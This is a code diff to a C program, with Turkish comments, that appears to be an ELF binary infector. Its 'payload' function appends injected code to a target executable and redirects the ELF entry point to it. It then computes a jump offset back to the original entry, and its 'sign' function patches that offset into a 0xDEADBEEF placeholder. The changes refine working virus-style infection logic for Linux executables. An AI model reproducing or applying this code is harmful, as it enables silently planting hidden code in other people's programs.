@@ -20,7 +20,6 @@ Elf64_Phdr *last_phdr(char *data)
     return target;
 }
 
-
 uint64_t payload(char *data, size_t data_size, char *code, size_t code_size)
 {
     Elf64_Phdr  *target;
@@ -29,7 +28,7 @@ uint64_t payload(char *data, size_t data_size, char *code, size_t code_size)
     uint64_t    gap;
     uint64_t    old_entry;
     uint64_t    new_entry;
-    
+    uint64_t    delta;
 
     target = last_phdr(data);
     ehdr = (Elf64_Ehdr *)data;
@@ -42,7 +41,8 @@ uint64_t payload(char *data, size_t data_size, char *code, size_t code_size)
     old_entry = ehdr->e_entry;
     ehdr->e_entry = new_entry;
     memmove(data + data_size, code, code_size);
-    return old_entry;
+    delta = (int64_t)old_entry - (int64_t)(new_entry + POP_RAX_OFFSET);
+    return delta;
 }
 
 int is_signed(t_file file)
@@ -90,8 +90,10 @@ int sign(t_file target)
     //target = file_load("example", payload_.size); target payload_.size kadar ustune koymali,  
     entry =  payload(target.head, target.size - payload_.size, payload_.head, payload_.size);
     patch = memmem(target.head, target.size, "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE", 8); // yertutucum
-    *patch = entry;
+    if (patch)
+        *patch = entry;
 //    file_unload(target); target unload edilmeli.
     file_unload(payload_);
     return 0;
 }
+
